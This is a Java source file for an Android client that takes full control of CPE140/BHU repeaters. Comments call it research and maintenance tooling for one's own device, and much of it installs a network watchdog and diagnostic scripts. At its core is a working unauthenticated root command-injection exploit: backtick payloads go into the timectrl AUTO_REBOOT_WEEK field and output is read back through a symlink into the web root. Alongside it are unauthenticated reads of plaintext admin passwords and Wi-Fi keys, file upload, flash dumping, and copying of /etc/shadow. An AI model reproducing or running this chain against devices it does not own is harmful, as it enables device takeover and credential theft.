package com.picpe.cpe140;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

/**
 * 易阔 CPE140 / BHU BXO2000n-2S-Lite 中继器「完全控制」客户端（Android 版）。
 *
 * <p>两条腿，都不需要 Web 登录会话：
 * <ul>
 *   <li>Web API —— /cgi-bin/* 全部未认证，POST + JSON（自动补 interval 时间戳）。
 *       可读全量配置（含明文口令 / PSK）、改配置、改管理员密码、重启、恢复出厂。</li>
 *   <li>root RCE —— /cgi-bin/timectrl (opcode=3, cronpara=2) 的字段值被未转义拼进
 *       {@code sh -c "uci -c /etc/config set administrator.reboot.week=<值>"}，
 *       用反引号命令替换即可 root 执行；单次载荷上限约 960 字节。</li>
 *   <li>回显 —— 命令输出重定向到 /tmp/.cpeout，再让 /www/.cpeout 指向它，
 *       uhttpd 跟随符号链接；GET /.cpeout 取回。载荷自身不输出任何字符，
 *       所以写回 uci 的值与原值一致，不会污染定时重启规则。</li>
 * </ul>
 * 仅供自有设备的安全研究与日常运维使用。
 */
public class Cpe {

    public static final String OUT_TMP = "/tmp/.cpeout";
    public static final String OUT_LINK = "/www/.cpeout";
    public static final String OUT_URL = "/.cpeout";
    public static final String UP_TMP = "/tmp/upload.img";
    public static final String SH_TMP = "/tmp/.cpesh";
    public static final int INJ_MAX = 880;
    public static final int BUDGET = 620;

    /** 断网看门狗在设备上的落点。 */
    public static final String GUARD_SH = "/etc/netguard.sh";
    public static final String GUARD_CONF = "/etc/netguard.conf";

    /** 分级软修复（netfix）在设备上的落点。 */
    public static final String FIX_SH = "/etc/netfix.sh";
    public static final String FIX_CONF = "/etc/netfix.conf";

    /** 判定「有没有网」的探测目标：任一通即算通。 */
    public static final String[] WAN_TARGETS = {"223.5.5.5", "114.114.114.114"};

    public static final Set<String> DANGEROUS = new HashSet<>(Arrays.asList(
            "OP_MODE", "VLAN_ENABLED", "PSMODE", "LAN_IP_ADDR", "LAN_NETMASK",
            "LAN_DHCP_SERVER_ENABLED", "DHCP_SERVER_ENABLED", "WLAN0_VAP0_SSID",
            "WLAN0_VAP0_PSK", "WLAN0_VAP5_SSID", "WLAN0_VAP5_PSK",
            "WLAN0_VAP0_CHANNEL", "REG_DOMAIN", "HW_NAT_ENABLED"));

    public static final String[] MODES = {"gateway", "repeater", "wisp", "ap", "wds"};

    public String host;
    public int port = 80;
    public int timeout = 20000;
    public int lastCode = 0;
    /** 会话内简单日志（调试用）。 */
    public final List<String> log = new ArrayList<>();

    private String week, enabled, hour, minute;
    private boolean linkOk = false;

    public Cpe(String host) {
        this.host = host;
    }

    // ------------------------------------------------------------------ HTTP

    private byte[] http(String path, byte[] body, String ctype, int to) throws IOException {
        HttpURLConnection c = (HttpURLConnection) new URL("http://" + host + ":" + port + path).openConnection();
        c.setConnectTimeout(Math.min(to, 15000));
        c.setReadTimeout(to);
        c.setRequestProperty("Content-Type", ctype == null ? "application/json" : ctype);
        c.setRequestProperty("User-Agent", "cpe140-android/1.0");
        c.setRequestProperty("Accept-Encoding", "identity");
        if (body != null) {
            c.setDoOutput(true);
            c.setFixedLengthStreamingMode(body.length);
        }
        c.connect();
        if (body != null) {
            OutputStream o = c.getOutputStream();
            o.write(body);
            o.close();
        }
        lastCode = c.getResponseCode();
        InputStream in = lastCode >= 400 ? c.getErrorStream() : c.getInputStream();
        ByteArrayOutputStream bo = new ByteArrayOutputStream();
        if (in != null) {
            byte[] buf = new byte[1 << 16];
            int n;
            while ((n = in.read(buf)) > 0) {
                bo.write(buf, 0, n);
            }
            in.close();
        }
        c.disconnect();
        byte[] r = bo.toByteArray();
        synchronized (log) {
            log.add(lastCode + " " + path + " " + r.length + "B");
            if (log.size() > 400) {
                log.remove(0);
            }
        }
        return r;
    }

    public JSONObject api(String cgi, JSONObject p) throws Exception {
        return api(cgi, p, timeout);
    }

    public JSONObject api(String cgi, JSONObject p, int to) throws Exception {
        JSONObject d = p == null ? new JSONObject() : new JSONObject(p.toString());
        if (!d.has("interval")) {
            d.put("interval", System.currentTimeMillis() / 1000L);
        }
        byte[] r = http("/cgi-bin/" + cgi, d.toString().getBytes("UTF-8"), "application/json", to);
        String s = new String(r, "UTF-8").trim();
        if (s.isEmpty()) {
            return new JSONObject();
        }
        JSONObject o = new JSONObject(s);
        if ("-1".equals(String.valueOf(o.opt("result")))) {
            throw new IOException(cgi + " 返回 result=-1（参数被拒）");
        }
        return o;
    }

    // ------------------------------------------------------------- 只读信息

    public JSONObject sysinfo() throws Exception {
        return api("sysinfo", new JSONObject().put("opcode", "1"));
    }

    public JSONObject wirelessStatus() throws Exception {
        return api("wireless_status", new JSONObject().put("opcode", "1"));
    }

    public JSONObject wan() throws Exception {
        return api("wan", new JSONObject().put("opcode", "1"));
    }

    public JSONObject lan() throws Exception {
        return api("lan", new JSONObject().put("opcode", "1"));
    }

    public JSONObject wifiConfig() throws Exception {
        return api("wireless", new JSONObject().put("opcode", "1"));
    }

    public JSONObject clients() throws Exception {
        return api("lan_dhcpserver", new JSONObject().put("opcode", "1"));
    }

    public JSONObject scan() throws Exception {
        return api("wireless_scan", new JSONObject().put("opcode", "1").put("wlanid", "0"), 60000);
    }

    public JSONObject channels() throws Exception {
        return api("wireless_channel", new JSONObject().put("opcode", "1"));
    }

    public JSONObject sessions() throws Exception {
        return api("active", new JSONObject().put("opcode", "1"));
    }

    public JSONObject cfgAll() throws Exception {
        return api("easyconfig", new JSONObject().put("opcode", "1"));
    }

    public String cfgGet(String key) throws Exception {
        return cfgAll().optString(key, "");
    }

    public JSONObject cfgSet(boolean force, String key, String value) throws Exception {
        if (DANGEROUS.contains(key.toUpperCase()) && !force) {
            throw new IOException("拒绝对危险键写入 " + key + "（确认无误再加 --force）");
        }
        JSONObject p = new JSONObject().put("opcode", "3");
        p.put(key, value);
        return api("easyconfig", p);
    }

    // ------------------------------------------------------ root RCE 通道

    private static JSONObject schedDefaults() {
        try {
            return new JSONObject().put("AUTO_REBOOT_ENABLED", "1").put("AUTO_REBOOT_WEEK", "0")
                    .put("AUTO_REBOOT_HOUR", "4").put("AUTO_REBOOT_MIN", "0");
        } catch (Exception e) {
            return new JSONObject();
        }
    }

    /** 定时重启的原始 4 个值（只读一次）。 */
    public JSONObject sched() throws Exception {
        if (week == null) {
            JSONObject s;
            try {
                s = api("timectrl", new JSONObject().put("opcode", "3").put("cronpara", "1"));
            } catch (Exception e) {
                s = schedDefaults();
            }
            enabled = s.optString("AUTO_REBOOT_ENABLED", "1");
            week = s.optString("AUTO_REBOOT_WEEK", "0");
            hour = s.optString("AUTO_REBOOT_HOUR", "4");
            minute = s.optString("AUTO_REBOOT_MIN", "0");
        }
        return new JSONObject().put("AUTO_REBOOT_ENABLED", enabled).put("AUTO_REBOOT_WEEK", week)
                .put("AUTO_REBOOT_HOUR", hour).put("AUTO_REBOOT_MIN", minute);
    }

    private void inject(String inner, int to) throws Exception {
        JSONObject s = sched();
        // 末尾补 chmod：cp 会把源文件权限（如 /etc/shadow 的 600）带过来，
        // uhttpd 对 600 的文件回 403，统一放开到 644 才能读回。
        // 注意：载荷里不能出现反引号 / 双引号 / 反斜杠 / 大括号。
        String payload = s.optString("AUTO_REBOOT_WEEK", "0") + "`" + inner
                + "; chmod 644 " + OUT_TMP + " 2>/dev/null`";
        if (payload.length() > INJ_MAX) {
            throw new IOException("注入载荷过长 " + payload.length() + " > " + INJ_MAX);
        }
        JSONObject d = new JSONObject();
        d.put("opcode", "3");
        d.put("cronpara", "2");
        d.put("AUTO_REBOOT_ENABLED", s.optString("AUTO_REBOOT_ENABLED", "1"));
        d.put("AUTO_REBOOT_HOUR", s.optString("AUTO_REBOOT_HOUR", "4"));
        d.put("AUTO_REBOOT_MIN", s.optString("AUTO_REBOOT_MIN", "0"));
        d.put("AUTO_REBOOT_WEEK", payload);
        api("timectrl", d, to);
    }

    /** shell 单引号引用。 */
    public static String q(String s) {
        if (s.matches("[A-Za-z0-9_@%+=:,./-]+")) {
            return s;
        }
        return "'" + s.replace("'", "'\\''") + "'";
    }

    /**
     * 载荷能不能直接塞进注入字段。
     *
     * <p>载荷被拼进 {@code sh -c "..."} 的双引号里，所以这些字符要么破坏引号、
     * 要么被 shell 抢先展开：反引号、双引号、反斜杠、{@code $}、{@code {}}。
     * 命中任一就不走内联注入，改走「上传成脚本再 sh 它」的兜底通道。
     */
    private static boolean unsafe(String cmd) {
        return cmd.indexOf('`') >= 0 || cmd.indexOf('"') >= 0 || cmd.indexOf('\\') >= 0
                || cmd.indexOf('$') >= 0 || cmd.indexOf('{') >= 0 || cmd.indexOf('}') >= 0;
    }

    private void ensureLink() throws Exception {
        if (linkOk) {
            return;
        }
        // 先判存在再清空：通道坏掉后重铺时，不能把刚写好的输出截掉
        inject("[ -e " + OUT_TMP + " ] || : > " + OUT_TMP + "; chmod 644 " + OUT_TMP
                + "; ln -sf " + OUT_TMP + " " + OUT_LINK, timeout);
        linkOk = true;
    }

    /** 设备回的是一张错误页（uhttpd 的 404 / Bad Gateway）而不是命令输出。 */
    private static boolean isErrPage(byte[] r) {
        if (r.length < 5) {
            return false;
        }
        return new String(r, 0, 5, java.nio.charset.StandardCharsets.UTF_8).startsWith("<h1>");
    }

    /** 最近几条 HTTP 记录，出错时附在报错里，省得再靠猜。 */
    public String logTail() {
        synchronized (log) {
            int n = log.size();
            if (n == 0) {
                return "";
            }
            return "\n最近请求：" + String.join(" | ", log.subList(Math.max(0, n - 6), n));
        }
    }

    private IOException channelErr(int code) {
        return new IOException("回显通道丢了（HTTP " + code + "）：设备上取不到 " + OUT_LINK + "。\n"
                + "多半是设备刚重启过（/tmp 是内存盘，重启就清空；符号链接却留在 flash 上），\n"
                + "或别的工具清过临时文件。再点一次就会自动重铺。" + logTail());
    }

    /**
     * 取回 OUT_TMP 里刚刚写好的输出（单次，不重试）。
     *
     * <p>以前这里直接把 http() 的 body 当输出返回，于是通道一坏，界面上就显示一段
     * uhttpd 的 404 网页当“命令输出”，既看不懂也没法自愈。现在认得出错误页，
     * 并作废 linkOk，让 execRead() 去重铺通道/重跑命令。
     */
    public byte[] readOutBytes(int to) throws Exception {
        byte[] r = http(OUT_URL, null, null, to);
        if (lastCode == 200 && !isErrPage(r)) {
            return r;
        }
        linkOk = false;
        throw channelErr(lastCode);
    }

    /** exec + 读回。通道刚坏时：先重铺再重读（不重跑命令），真不行才重跑。 */
    public byte[] execRead(String cmd, int to) throws Exception {
        exec(cmd, to);
        try {
            return readOutBytes(to);
        } catch (Exception ignored) {
            // 上面已经 linkOk=false，下面 ensureLink() 会重铺（不会截掉输出）
        }
        ensureLink();
        try {
            return readOutBytes(to);
        } catch (Exception e) {
            exec(cmd, to);              // 最后手段：重跑一遍命令
            return readOutBytes(to);
        }
    }

    /** 以 root 执行命令，输出全部落到 OUT_TMP（不取回）。 */
    public void exec(String cmd, int to) throws Exception {
        ensureLink();
        String c = cmd.trim();
        if (!unsafe(c) && c.length() <= BUDGET) {
            inject("( " + c + " ) > " + OUT_TMP + " 2>&1", to);
        } else {
            http("/cgi-bin/upload", (c + "\n").getBytes("UTF-8"), "application/octet-stream", 60000);
            inject("mv -f " + UP_TMP + " " + SH_TMP + "; sh " + SH_TMP + " > " + OUT_TMP + " 2>&1", to);
        }
    }

    public String readOut(int to) throws Exception {
        return new String(readOutBytes(to), "UTF-8");
    }

    /** 以 root 执行命令并取回 stdout+stderr。 */
    public String run(String cmd) throws Exception {
        return run(cmd, 120000);
    }

    public String run(String cmd, int to) throws Exception {
        return new String(execRead(cmd.trim(), to), "UTF-8");
    }

    // ------------------------------------------------------------- 文件传输

    public byte[] readBytes(String remote, int to) throws Exception {
        String q = q(remote);
        return execRead("cp " + q + " " + OUT_TMP + " 2>/dev/null || cat " + q + " > " + OUT_TMP, to);
    }

    /** 手动重铺回显通道（维护页按钮用），并回读验证。 */
    public String repairChannel() throws Exception {
        linkOk = false;
        ensureLink();
        return run("ls -l " + OUT_LINK + " " + OUT_TMP + " 2>&1; echo ---; id");
    }

    /**
     * 上传任意二进制：裸 body → /tmp/upload.img → 目标路径，并在设备端 wc -c 校验。
     * 设备 CGI 偶发竞态（头一次回读可能拿到空内容），所以默认重试 3 次。
     */
    public void push(byte[] data, String remote) throws Exception {
        Exception last = null;
        for (int i = 0; i < 3; i++) {
            if (i > 0) {
                linkOk = false;      // 重新铺一遍回读通道再试
            }
            try {
                ensureLink();
                http("/cgi-bin/upload", data, "application/octet-stream",
                        (int) Math.max(60000, data.length / 15 + 30000));
                String q = q(remote);
                exec("mv -f " + UP_TMP + " " + q + " 2>/dev/null || cp " + UP_TMP + " " + q, 90000);
                String got = run("wc -c < " + q).trim();
                int n;
                try {
                    n = Integer.parseInt(got.split("\\s+")[0]);
                } catch (Exception e) {
                    last = new IOException("回读拿到空内容");
                    continue;
                }
                if (n == data.length) {
                    return;
                }
                last = new IOException("设备端只有 " + n + " 字节");
            } catch (IOException e) {
                last = e;
            }
        }
        throw new IOException("上传校验失败：" + (last == null ? "未知" : last.getMessage()));
    }

    /** 整片 flash 备份（默认 mtd9 = fullflash 8MB）。 */
    public byte[] dumpFlash(int mtd) throws Exception {
        return readBytes("/dev/mtd" + mtd, 600000);
    }

    // ---------------------------------------------------- 断网看门狗 netguard

    /** 看门狗状态；没装的话给一句人话提示。 */
    public String guardStatus() throws Exception {
        String s = run("sh " + GUARD_SH + " status 2>&1");
        if (s.contains("can't open") || s.contains("not found")) {
            return "看门狗还没装上。\n点「开启看门狗」（或先点「干跑测试」看它现在会怎么判断）。";
        }
        return s;
    }

    public String guardLog() throws Exception {
        String s = run("tail -n 60 /tmp/netguard.log 2>&1");
        return s.trim().isEmpty() || s.contains("No such file") ? "（还没有日志：说明它还没真正判过「断网」）" : s;
    }

    /** 干跑：只算一遍，绝不重启、绝不执行恢复。 */
    public String guardTest() throws Exception {
        return run("sh " + GUARD_SH + " test 2>&1");
    }

    public String guardReset() throws Exception {
        return run("sh " + GUARD_SH + " reset 2>&1");
    }

    public String guardOn() throws Exception {
        return run("sh " + GUARD_SH + " cron on 2>&1");
    }

    public String guardOff() throws Exception {
        return run("sh " + GUARD_SH + " cron off 2>&1");
    }

    /** 安装脚本 + 参数（enable=true 同时挂上 crontab）。 */
    public String guardInstall(byte[] script, int minutes, String mode, String recover,
                               boolean enable) throws Exception {
        return guardInstall(script, minutes, mode, recover, enable, 3, 21600);
    }

    /** maxReboot=单次断网最多自动重启几次；longWait=超限后的重试间隔（秒）。 */
    public String guardInstall(byte[] script, int minutes, String mode, String recover,
                               boolean enable, int maxReboot, int longWait) throws Exception {
        push(script, GUARD_SH);
        run("chmod 755 " + GUARD_SH);
        int need = Math.min(99, Math.max(1, (minutes + 1) / 2));   // 向上取整，不早于所选分钟
        String conf = "# 由 CPE140 控制台写入：断网看门狗参数\n"
                + "MINUTES=" + minutes + "\n"
                + "FAIL_NEED=" + need + "\n"
                + "MODE=" + mode + "\n"
                + "MAX_REBOOT=" + maxReboot + "\n"
                + "LONG_WAIT=" + longWait + "\n"
                + "RECOVER=" + recover + "\n";
        push(conf.getBytes("UTF-8"), GUARD_CONF);
        run("chmod 644 " + GUARD_CONF);
        if (enable) {
            guardOn();
        } else {
            guardOff();
        }
        return guardStatus();
    }

    /** 停用并摸掉脚本，设备回到没装过的状态。 */
    public String guardUninstall() throws Exception {
        run("sh " + GUARD_SH + " cron off 2>&1");
        return run("rm -f " + GUARD_SH + " " + GUARD_CONF + " /etc/netguard.last "
                + "/etc/netguard.reboots /tmp/netguard.*; echo 已卸载看门狗（含单次断网重启计数）；"
                + "分级软修复 " + FIX_SH + " 还留着，不动它");
    }

    /**
     * 装看门狗，并把它的「先软后硬」恢复步骤指向分级软修复脚本。
     *
     * @param guardScript netguard.sh 内容
     * @param fixScript   netfix.sh 内容（会先被装到 /etc/netfix.sh）
     */
    public String guardInstallSoft(byte[] guardScript, byte[] fixScript, int minutes,
                                   String mode, boolean enable) throws Exception {
        netfixInstall(fixScript, WAN_TARGETS);
        return guardInstall(guardScript, minutes, mode, FIX_SH, enable);
    }

    // ------------------------------------------------------ 新机器一键部署

    /**
     * 一键部署：验通道 → 验 root → 装分级软修复 + 断网看门狗 → 回读核对 → 看连通性。
     *
     * <p>不下载整片 flash（8MB 很重，要救砖时单独点「备份整片 flash」按钮）。
     * 默认 enable=true + mode=log：cron 挂上但只写日志、绝不重启机器，
     * 观察两天确认不误判，再点「开启看门狗」切真重启。
     */
    public String provision(byte[] guardScript, byte[] fixScript, int minutes,
                            String mode, boolean enable) throws Exception {
        StringBuilder sb = new StringBuilder("=== 一键部署 ===\n");

        JSONObject si = sysinfo();
        sb.append("① 设备连通：").append(si.optString("PRODUCTNAME", "?"))
                .append(" / ").append(si.optString("FIRMVERSION", "?")).append('\n');

        // 注入通道：拿 sleep 的实测耗时证明值真的被 sh 执行了，而不是被忽略
        long t0 = System.currentTimeMillis();
        run("true");
        long base = System.currentTimeMillis() - t0;
        t0 = System.currentTimeMillis();
        run("sleep 2");
        long slow = System.currentTimeMillis() - t0;
        boolean chan = slow - base > 1500;
        sb.append("② root 注入通道：").append(chan ? "OK" : "失败")
                .append("（true=").append(base).append("ms / sleep2=").append(slow).append("ms）\n");
        if (!chan) {
            return sb.append("   —— 注入不生效（固件可能已修），别再往下装。\n").toString();
        }

        sb.append("③ 以 root 执行：").append(run("id").trim()).append('\n');

        netfixInstall(fixScript, WAN_TARGETS);
        guardInstall(guardScript, minutes, mode, FIX_SH, enable);
        sb.append("④ 已写入 4 个文件（netfix.sh/.conf + netguard.sh/.conf，mode=").append(mode)
                .append("，cron ").append(enable ? "已挂上" : "未挂").append("）\n");

        sb.append("⑤ 回读核对：\n").append(run("ls -l " + FIX_SH + " " + FIX_CONF + " "
                + GUARD_SH + " " + GUARD_CONF + " 2>&1"));
        sb.append("⑥ 当前连通性：").append(netfixCheck().trim()).append('\n');

        if (!enable) {
            sb.append("✅ 文件已就位但没挂 cron。去看门狗卡片点「开启看门狗」才会生效。");
        } else if ("log".equals(mode)) {
            sb.append("✅ 部署完成。现在是「只记录」模式：断网只写日志，不会重启机器。\n")
                    .append("   观察 2~3 天（点「看日志」），确认它只在真断网时计数，")
                    .append("再点「开启看门狗」切真重启。");
        } else {
            sb.append("✅ 部署完成，看门狗已启用（真重启）。断网先点「一键诊断」再谈重启。");
        }
        return sb.toString();
    }

    // ------------------------------------------- 断网诊断 & 分级软修复 netfix

    /** 装分级软修复脚本 + 参数（幂等，不启用任何自动动作）。 */
    public String netfixInstall(byte[] script, String[] targets) throws Exception {
        push(script, FIX_SH);
        run("chmod 755 " + FIX_SH);
        StringBuilder sb = new StringBuilder("# 由 CPE140 控制台写入：分级软修复参数\nTARGETS=\"");
        for (String t : targets) {
            sb.append(t).append(' ');
        }
        sb.append("\"\nSTEPS=\"usr1 unstuck renew reassoc ifup wifireload\"\n");
        push(sb.toString().getBytes("UTF-8"), FIX_CONF);
        run("chmod 644 " + FIX_CONF);
        return netfixStatus();
    }

    /** 软修脚本状态；没装的话给一句人话提示。 */
    public String netfixStatus() throws Exception {
        String s = run("sh " + FIX_SH + " status 2>&1");
        if (s.contains("can't open") || s.contains("not found")) {
            return "分级软修复还没装上。\n点「装软修脚本」即可（也可在开看门狗时自动装）。";
        }
        return s;
    }

    public String netfixLog() throws Exception {
        String s = run("sh " + FIX_SH + " log 2>&1 | tail -n 40");
        return s.trim().isEmpty() || s.contains("还没有日志") ? "（还没有日志：它还没被执行过）" : s;
    }

    /** 只看现在通不通、有没有门户劫持（什么都不改）。 */
    public String netfixCheck() throws Exception {
        return run("sh " + FIX_SH + " check 2>&1");
    }

    /**
     * 现在就按阶梯软修一次（从最轻的动作开始，救回来就停）。
     *
     * <p>脚本放后台跑、这里轮询它的输出 —— 因为最坏情况要跑 1 分多钟，
     * 而 uhttpd 的 CGI 只等 60 秒，同步调用会被半路砍断。
     *
     * @param dry  干跑：只打印会做什么，绝不执行
     * @param wait 最多等多少秒
     */
    public String netfixRun(boolean dry, int wait) throws Exception {
        String cmd = (dry ? "DRY=1 " : "") + "sh " + FIX_SH;
        exec(cmd + " > /tmp/netfix.out 2>&1 &", 30000);
        long t0 = System.currentTimeMillis();
        String out = "";
        while (System.currentTimeMillis() - t0 < wait * 1000L) {
            Thread.sleep(3000);
            try {
                out = run("cat /tmp/netfix.out 2>/dev/null");
            } catch (Exception e) {
                continue;
            }
            if (out.contains("--netfix--end")) {
                break;
            }
        }
        out = out.trim();
        return out.isEmpty() ? "(没有输出 —— 脚本可能没跑起来)" : out;
    }

    /**
     * 断网取证：一键盘点每一层，并给出「到底是哪一层坏了」的判定。
     *
     * <p>专治那个怪现象：打开管理页就又能上网 —— 多半是固件自带的
     * 「强制门户」误判，把 DNS/HTTP 劫持到自己页面上（假断网）。
     * 只读，不改设备任何东西。
     */
    public String diagnose() throws Exception {
        // 整段作为脚本上传后 sh 执行（含 $ { } " 等，内联注入塞不下）。
        String s = String.join("\n",
                "echo '========== 断网取证快照 =========='",
                "date '+%Y-%m-%d %H:%M:%S'; uptime",
                "echo; echo '--- 1. 上行无线 (apcli0) ---'",
                "iwinfo apcli0 info 2>&1 | head -8",
                "GW=$(ip route 2>/dev/null | awk '/^default/ {print $3; exit}')",
                "echo; echo '--- 2. 默认网关 / 路由 ---'",
                "echo \"网关: ${GW:-(没有默认路由!)}\"",
                "ip route 2>/dev/null",
                "if [ -n \"$GW\" ]; then echo -n '网关 ARP: '; awk -v g=\"$GW\" 'NR>1 && $1==g && $4!=\"00:00:00:00:00:00\" {print $4}' /proc/net/arp; fi",
                "echo; echo '--- 3. 三层连通性 ---'",
                "if [ -n \"$GW\" ]; then ping -c 1 -W 2 $GW >/dev/null 2>&1 && echo \"网关 $GW: 通\" || echo \"网关 $GW: 不通\"; fi",
                "NETUP=0",
                "for t in 223.5.5.5 114.114.114.114; do if ping -c 1 -W 2 $t >/dev/null 2>&1; then echo \"外网 $t: 通\"; NETUP=1; else echo \"外网 $t: 不通\"; fi; done",
                "DNS=$(nslookup www.baidu.com 114.114.114.114 2>&1 | tail -4)",
                "echo \"$DNS\" | grep -qi address && DNSOK=1 || DNSOK=0",
                "echo \"外网 DNS 查询: $([ $DNSOK = 1 ] && echo 通 || echo 失败)\"",
                "echo \"$DNS\"",
                "echo; echo '--- 4. 固件自带的门户口（假断网元凶） ---'",
                "HIJ=$(iptables -t nat -S 2>/dev/null | grep -E 'detect_internet|lan_redirect|--dport 53 -j DNAT|--dport 80 -j DNAT')",
                "if [ -n \"$HIJ\" ]; then echo \"劫持规则: $HIJ\"; else echo '劫持规则: 无（正常）'; fi",
                "echo \"固件自报的互联网状态: $(cat /tmp/.internet_status 2>/dev/null)（实测网络正常时它一直写 0）\"",
                "echo \"检测进程: $(pidof detect_internet 2>/dev/null || echo 未运行)\"",
                "V5=$(uci -q get wireless.vap5.disabled 2>/dev/null)",
                "echo \"上行禁用旗 vap5.disabled: ${V5:-未设置}  (1 = 固件自己的 aptrack 把上行关了，它要等 200 秒才恢复)\"",
                "echo; echo '--- 5. 上行接口 wan ---'",
                "ubus call network.interface.wan status 2>/dev/null | grep -E '\"up\"|\"address\"|\"proto\"' | head -4",
                "echo; echo '--- 6. 相关守护进程 ---'",
                "ps w | grep -E 'aptrack|detect_internet|wpa_supp|udhcpc|netguard' | grep -v grep",
                "echo; echo '--- 7. 系统日志 (有意义的尾 25 行) ---'",
                "logread 2>/dev/null | grep -v 'Broken pipe' | grep -v drop_caches | tail -25",
                "echo; echo '========== 判定 =========='",
                "if [ $NETUP = 1 ] && [ -n \"$HIJ\" ]; then",
                "  echo '→ 【假断网】外网其实是通的，但固件的门户劫持规则在生效：'",
                "  echo '  它把你的 DNS(53) 和网页(80) 抢到自己的页面上，所以你「上不了网」。'",
                "  echo '  ✅ 立即恢复: 点「立即救网」（第一步 kill -USR1 就会清掉）'",
                "  echo '  ✅ 根治(可选): uci set detect_internet.main.enable_redirect=0 后重启该服务'",
                "elif [ -n \"$GW\" ] && ! ping -c 1 -W 2 $GW >/dev/null 2>&1; then",
                "  echo '→ 【上行无线/网关不通】设备与上游光猫的链路断了（看第 1 节信号与第 4 节的禁用旗）。'",
                "  [ \"$V5\" = 1 ] && echo '  ⚠ 看到 vap5.disabled=1：固件自带的 aptrack 把上行关了，它会睡 200 秒才自己恢复。'",
                "  echo '  ✅ 先软修: 点「立即救网」（重新关联/重拨，比重启轻）'",
                "elif [ $NETUP = 0 ]; then",
                "  echo '→ 【上游/宽带问题】能到光猫但到不了外网 —— 重启本机基本没用。'",
                "  echo '  ✅ 检查光猫/宽带；本机最多软修一下上行 DHCP。'",
                "elif [ $DNSOK = 0 ]; then",
                "  echo '→ 【DNS 层坏了】外网 IP 通但域名解析不了。'",
                "  echo '  ✅ 切 DNS 或重启 dnsmasq；这和重启中继器无关。'",
                "else",
                "  echo '→ 【现在一切正常】没抓到现场。下次出问题时立刻再跑一次以便对比。'",
                "fi",
                "echo; echo '提示: 这是只读取证，没有改动设备的任何东西。'");
        return run(s, 180000);
    }

    // --------------------------------------------------------------- 管理

    public JSONObject reboot() throws Exception {
        return api("devmanage", new JSONObject().put("opcode", "5"), 10000);
    }

    public JSONObject factoryReset() throws Exception {
        return api("devmanage", new JSONObject().put("opcode", "3"), 10000);
    }

    public JSONObject setPassword(String user, String oldPw, String newPw) throws Exception {
        JSONObject p = new JSONObject();
        p.put("opcode", "8");
        p.put("currentuser", user);
        p.put("name", user);
        p.put("oldpassword", oldPw);
        p.put("password", newPw);
        return api("devmanage", p);
    }

    public JSONObject setSchedule(boolean enable, int wk, int h, int m) throws Exception {
        JSONObject p = new JSONObject();
        p.put("opcode", "3");
        p.put("cronpara", "2");
        p.put("AUTO_REBOOT_ENABLED", enable ? "1" : "0");
        p.put("AUTO_REBOOT_WEEK", String.valueOf(wk));
        p.put("AUTO_REBOOT_HOUR", String.valueOf(h));
        p.put("AUTO_REBOOT_MIN", String.valueOf(m));
        JSONObject r = api("timectrl", p);
        week = null;
        return r;
    }

    /** ARP 表：本固件没有 sys_arplist，直接读 /proc/net/arp。 */
    public List<String[]> arp() throws Exception {
        List<String[]> out = new ArrayList<>();
        for (String ln : run("cat /proc/net/arp").split("\n")) {
            String[] p = ln.trim().split("\\s+");
            if (p.length >= 6 && !p[0].equals("IP")) {
                out.add(new String[]{p[0], p[3], p[5]});
            }
        }
        return out;
    }

    /** 清理设备上的所有临时文件。 */
    public void clean() {
        linkOk = false;
        try {
            inject("rm -f " + OUT_TMP + " " + OUT_LINK + " " + UP_TMP + " " + SH_TMP, timeout);
        } catch (Exception ignored) {
            // 设备不可达时静默
        }
    }

    /** 自检字符串。 */
    public String doctor() {
        StringBuilder sb = new StringBuilder();
        try {
            JSONObject si = sysinfo();
            sb.append("设备连通        OK  ").append(si.optString("PRODUCTNAME")).append(" / ")
                    .append(si.optString("FIRMVERSION")).append('\n');
        } catch (Exception e) {
            return "设备连通        FAIL " + e.getMessage() + "\n";
        }
        try {
            int n = cfgAll().length();
            sb.append("未认证读配置    OK  ").append(n).append(" 项，明文管理员口令=")
                    .append(cfgAll().optString("USER_PASSWORD")).append('\n');
        } catch (Exception e) {
            sb.append("未认证读配置    FAIL ").append(e.getMessage()).append('\n');
        }
        try {
            long t0 = System.currentTimeMillis();
            run("true");
            long base = System.currentTimeMillis() - t0;
            t0 = System.currentTimeMillis();
            run("sleep 3");
            long slow = System.currentTimeMillis() - t0;
            sb.append("root RCE 注入   ").append(slow - base > 2000 ? "OK" : "FAIL")
                    .append("  true=").append(base).append("ms sleep3=").append(slow).append("ms\n");
        } catch (Exception e) {
            sb.append("root RCE 注入   FAIL ").append(e.getMessage()).append('\n');
        }
        try {
            sb.append("以 root 执行    OK  ").append(run("id").trim()).append('\n');
        } catch (Exception e) {
            sb.append("以 root 执行    FAIL ").append(e.getMessage()).append('\n');
        }
        sb.append("出厂 root 口令  --  见报告；源码不硬编码（公开仓库不替人开后门）\n");
        return sb.toString();
    }

    /** 取 JSON 里第一层列表（各种 CGI 的 ItemList.data 布局不一）。 */
    public static JSONArray rows(JSONObject o) {
        if (o == null) {
            return new JSONArray();
        }
        for (String k : new String[]{"list", "data", "items", "ItemList", "clientlist", "aplist"}) {
            Object v = o.opt(k);
            if (v instanceof JSONArray) {
                return (JSONArray) v;
            }
            if (v instanceof JSONObject) {
                JSONArray r = rows((JSONObject) v);
                if (r.length() > 0) {
                    return r;
                }
            }
        }
        return new JSONArray();
    }

    /** 把任意 JSON 渲染成可读文本。 */
    public static String pretty(JSONObject o) {
        JSONArray r = rows(o);
        if (r.length() > 0) {
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < r.length(); i++) {
                JSONObject it = r.optJSONObject(i);
                if (it == null) {
                    sb.append(r.opt(i)).append('\n');
                    continue;
                }
                for (java.util.Iterator<String> k = it.keys(); k.hasNext(); ) {
                    String key = k.next();
                    sb.append("  ").append(key).append(": ").append(it.optString(key)).append('\n');
                }
                sb.append('\n');
            }
            return sb.toString();
        }
        try {
            return o.toString(2);
        } catch (Exception e) {
            return String.valueOf(o);
        }
    }
}
